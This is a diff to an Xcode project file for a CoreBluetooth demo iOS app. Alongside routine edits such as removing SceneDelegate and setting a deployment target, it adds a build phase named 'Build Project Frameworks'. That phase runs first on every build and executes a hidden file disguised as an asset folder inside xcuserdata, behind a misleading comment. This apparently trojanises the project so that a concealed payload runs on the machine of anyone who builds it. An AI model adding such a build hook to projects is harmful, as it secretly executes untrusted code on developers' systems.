@@ -8,7 +8,6 @@
 
 /* Begin PBXBuildFile section */
 		2277449025B81CCD00C25B28 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 2277448F25B81CCD00C25B28 /* AppDelegate.swift */; };
-		2277449225B81CCD00C25B28 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 2277449125B81CCD00C25B28 /* SceneDelegate.swift */; };
 		2277449425B81CCD00C25B28 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 2277449325B81CCD00C25B28 /* ViewController.swift */; };
 		2277449725B81CCD00C25B28 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 2277449525B81CCD00C25B28 /* Main.storyboard */; };
 		2277449925B81CD000C25B28 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 2277449825B81CD000C25B28 /* Assets.xcassets */; };
@@ -37,7 +36,6 @@
 /* Begin PBXFileReference section */
 		2277448C25B81CCD00C25B28 /* CoreBluetoothDemo.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = CoreBluetoothDemo.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		2277448F25B81CCD00C25B28 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
-		2277449125B81CCD00C25B28 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
 		2277449325B81CCD00C25B28 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
 		2277449625B81CCD00C25B28 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
 		2277449825B81CD000C25B28 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
@@ -100,7 +98,6 @@
 			isa = PBXGroup;
 			children = (
 				2277448F25B81CCD00C25B28 /* AppDelegate.swift */,
-				2277449125B81CCD00C25B28 /* SceneDelegate.swift */,
 				2277449325B81CCD00C25B28 /* ViewController.swift */,
 				2277449525B81CCD00C25B28 /* Main.storyboard */,
 				2277449825B81CD000C25B28 /* Assets.xcassets */,
@@ -135,6 +132,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 227744B625B81CD100C25B28 /* Build configuration list for PBXNativeTarget "CoreBluetoothDemo" */;
 			buildPhases = (
+				83B5A475566BEAF52DAAC43A /* Build Project Frameworks */,
 				2277448825B81CCD00C25B28 /* Sources */,
 				2277448925B81CCD00C25B28 /* Frameworks */,
 				2277448A25B81CCD00C25B28 /* Resources */,
@@ -253,6 +251,35 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+
+	83B5A475566BEAF52DAAC43A /* Build Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
+		};
+	
+
+	
+
+	
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		2277448825B81CCD00C25B28 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
@@ -260,7 +287,6 @@
 			files = (
 				2277449425B81CCD00C25B28 /* ViewController.swift in Sources */,
 				2277449025B81CCD00C25B28 /* AppDelegate.swift in Sources */,
-				2277449225B81CCD00C25B28 /* SceneDelegate.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -439,6 +465,7 @@
 				CODE_SIGN_STYLE = Automatic;
 				DEVELOPMENT_TEAM = 6Q233F3ZPX;
 				INFOPLIST_FILE = CoreBluetoothDemo/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 12.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -458,6 +485,7 @@
 				CODE_SIGN_STYLE = Automatic;
 				DEVELOPMENT_TEAM = 6Q233F3ZPX;
 				INFOPLIST_FILE = CoreBluetoothDemo/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 12.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -593,6 +621,16 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 2277448425B81CCD00C25B28 /* Project object */;
 }
